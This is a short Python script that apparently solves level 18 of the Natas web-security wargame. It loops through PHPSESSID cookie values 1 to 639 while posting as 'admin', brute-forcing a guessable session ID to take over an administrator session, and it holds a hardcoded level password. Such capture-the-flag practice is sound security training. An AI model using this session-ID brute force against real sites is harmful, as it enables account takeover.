import natasX

natas = natasX

#print(natas.natasX(18, "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP", endpoint="index.php", data={"debug": "", "username": "natas19", "password": ""}))

for i in range(1, 640):
    print(natas.natasX(18, "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP", endpoint="index.php", data={"debug": "", "username": "admin", "password": ""}, cookies={"PHPSESSID": f'{i}'}).text)